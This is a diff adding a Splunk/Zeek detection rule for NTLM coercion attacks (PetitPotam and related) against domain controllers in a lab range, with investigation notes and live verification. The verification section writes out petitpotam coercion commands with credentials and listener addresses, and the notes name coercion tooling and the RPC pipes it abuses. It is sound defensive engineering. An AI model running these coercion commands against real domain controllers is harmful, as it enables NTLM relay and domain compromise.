@@ -1,0 +1,135 @@
+name: Forced Authentication
+id: ntlm-forced-authentication
+version: 1
+date: '2026-09-27'
+status: production
+category: ntlm
+description: >-
+  A domain controller initiating an outbound SMB connection (445/139) to a
+  host that isn't the other DC -- the network-visible *consequence* of a
+  coercion attack (PetitPotam/DFSCoerce/ShadowCoerce/PrinterBug/CheeseOunce:
+  any technique that abuses an RPC call to force a target to authenticate
+  outbound to an attacker-chosen listener). A DC is normally an SMB
+  *server* (things connect to it), never a client of an arbitrary host's
+  SMB service, so this happening at all is the signal -- detected by its
+  effect rather than the triggering RPC call itself, which turned out to
+  have no working telemetry source (see how_to_implement).
+data_source:
+  - Zeek conn.log, DC as id_orig_h, destination port 445 or 139, excluding DC-to-DC
+search: |-
+  index=zeek sourcetype=zeek:conn (id_orig_h=10.0.2.2 OR id_orig_h=10.0.2.3) (id_resp_p=445 OR id_resp_p=139) NOT (id_resp_h=10.0.2.2 OR id_resp_h=10.0.2.3)
+  | bucket _time span=1m
+  | stats values(id_resp_p) as ports by _time id_orig_h id_resp_h
+  | rename id_resp_h as destination, id_orig_h as host
+  | table destination host
+how_to_implement: >-
+  Requires defense-tooling's Zeek sensor forwarding conn.log (already
+  forwarded). No infra fix needed for this final approach -- but getting
+  here took real, documented investigation into two data sources that
+  DON'T work, both root-caused rather than assumed:
+
+  1. **Sysmon Events 17/18 on the DC, keyed on the coercion RPC's named
+  pipe** (the original design). Live-tested exhaustively against real
+  PetitPotam attacks (`petitpotam` PoC and cross-checked against
+  `Coercer`'s actual source on GitHub for the complete real pipe list
+  across every method it implements: MS-EFSR uses efsrpc/lsarpc/samr/
+  lsass/netlogon -- lsarpc/samr/netlogon are Windows RPC alias names that
+  resolve to the same underlying \lsass pipe, not separate pipe objects;
+  MS-RPRN uses spoolss; MS-DFSNM uses netdfs; MS-FSRVP uses Fssagentrpc;
+  MS-EVEN/"CheeseOunce" uses eventlog, missing from the original design
+  entirely). Along the way found the *deployed* Sysmon config on dc1/dc2
+  was stale -- the file matched the repo but had never actually been
+  reloaded into the running Sysmon driver via `sysmon64.exe -c
+  <file>` (a plain file overwrite is not enough; confirmed via
+  `sysmon64.exe -c` showing a hash from long before this session dumped
+  only the old, narrower ruleset even after the file was replaced).
+  Fixed the reload gap AND the incomplete pipe list, reran the attack --
+  **Event 18 (PipeConnected) still never fires for a remote SMB-based
+  pipe connection**, confirmed with the complete, corrected pipe list in
+  place; Event 18 clearly *can* fire (confirmed for unrelated local
+  processes like `dns.exe`/`wsmprovhost.exe` connecting to `\lsass`
+  locally), just not for this remote-origin case. Real limitation, not a
+  config gap -- **the Sysmon config changes made while investigating this
+  were reverted afterward** (see below) since they don't serve any working
+  detection.
+  2. **Zeek's dce_rpc.log**, decoding the EFSRPC bind itself -- doesn't
+  recognize the MS-EFSR interface UUID at all (confirmed: the underlying
+  SMB/445 connection lands in conn.log, no matching dce_rpc.log entry,
+  unlike SAMR/LSARPC's own well-known operations which Zeek decodes fine).
+  3. **What actually works:** the coerced DC's own resulting outbound
+  connection. Verified end-to-end with a real listener (Responder on the
+  `test` box, then again pointed at john-kali on a different subnet) --
+  confirmed via Responder's own log that DC1$'s real NTLM auth reached the
+  listener. Initially, Zeek's conn.log only captured DC1's outbound
+  connection when the listener was on a **different subnet/vnet**
+  (john-kali, 192.168.1.11) than the coerced DC, not when it was on the
+  same 10.0.2.0/24 segment (the `test` box, 10.0.2.10) -- traced to a real
+  infra gap in `cyber-range`'s network mirroring (see below), now fixed
+  domain-wide, not worked around here.
+  4. **The underlying mirroring gap, found and fixed (2026-09-27):**
+  `defense-tooling`'s existing `setup-mirror.sh` only mirrors the
+  **router's** (pfSense) own per-vnet tap interface. A Linux bridge is a
+  real switch -- two OTHER hosts on the same vnet talking directly (or
+  broadcasting) never reach the router's port at all, so the sensor never
+  saw same-vnet traffic, full stop (this is also why the Name resolution
+  poisoning detection couldn't see LLMNR/mDNS/NBT-NS broadcast traffic,
+  despite Zeek having working analyzers for two of the three). Fixed with
+  a new script, `defense-tooling/scripts/proxmox/mirror-vnet-guests.sh`,
+  that mirrors **every** guest's own tap on a given vnet (not just the
+  router's), so each host's own outbound traffic -- unicast to any
+  destination, or broadcast/multicast -- gets copied to the sensor
+  directly. Applied to the `ad` vnet's 8 guests (dc1/dc2/ca/web/sql1/sql2/
+  workstation/`test`). Checked specifically for double-counting from the
+  now-overlapping router-mirror + per-guest-mirror paths (a packet
+  originating on `ad` and crossing to another vnet could, in theory, be
+  captured both at its origin host's own tap and again as pfSense forwards
+  it onward) -- tested with a controlled cross-vnet TCP flow and a fixed-
+  count ping burst; byte/packet counts came back normal, not doubled, in
+  every check run. Flagging this as *empirically checked, not fully
+  explained* -- worth re-verifying if a future detection's counts ever
+  look inflated for cross-vnet flows.
+known_false_positives: >-
+  None found -- zero outbound SMB connections from either DC to a non-DC
+  host in 24h of range background traffic before this session's live
+  tests. **Documented gap in available fields, not fixed:** the planner's
+  `type` (which coercion method: PetitPotam/DFSCoerce/etc.) and `user`
+  fields aren't obtainable from this signal -- a plain outbound SMB
+  connection doesn't reveal which RPC call triggered it (that decode
+  layer doesn't work, see how_to_implement) or which machine-account
+  identity the resulting NTLM auth used (would need a Zeek ntlm.log
+  analyzer, not currently forwarded). `destination` (the attacker's
+  listener) is used as the Attacker-lookup field instead of the
+  traditional "source of the malicious activity", since here the DC
+  itself is the coerced victim, not the attacker.
+verification:
+  date: '2026-09-27'
+  method: Live attack execution against the cyberhawks.lab range
+  attacker_source: john-kali (VM 611)
+  technique:
+    - >-
+      petitpotam -u user -p password -d cyberhawks.lab 192.168.1.11
+      10.0.2.2 (listener on a different subnet than dc1) -- fired
+      correctly even before the mirroring fix.
+    - >-
+      petitpotam -u user -p password -d cyberhawks.lab 10.0.2.10 10.0.2.2
+      (listener on the SAME subnet as dc1, the `test` box) -- confirmed
+      NOT firing before the mirroring fix, confirmed firing correctly
+      after it.
+  result: >-
+    Real EFSRPC coercion confirmed both times (`ERROR_BAD_NETPATH`,
+    "Attack worked!"). DC1's resulting outbound connections landed in
+    Zeek's conn.log within the same second in both cases post-fix,
+    correctly deduplicated into one alert per minute-bucket, regardless of
+    which subnet the listener was on.
+embed:
+  title: Forced Authentication
+  additional_fields:
+    - host
+references:
+  - 'detections/backlog.md, "NTLM relay & coercion" (backlog row: "Coercion trigger")'
+  - Alert Embed Planner (see splunk-detections memory reference_alert_embed_planner.md)
+schedule:
+  cron: '* * * * *'
+  earliest: '-1m'
+  latest: now
+disabled: false
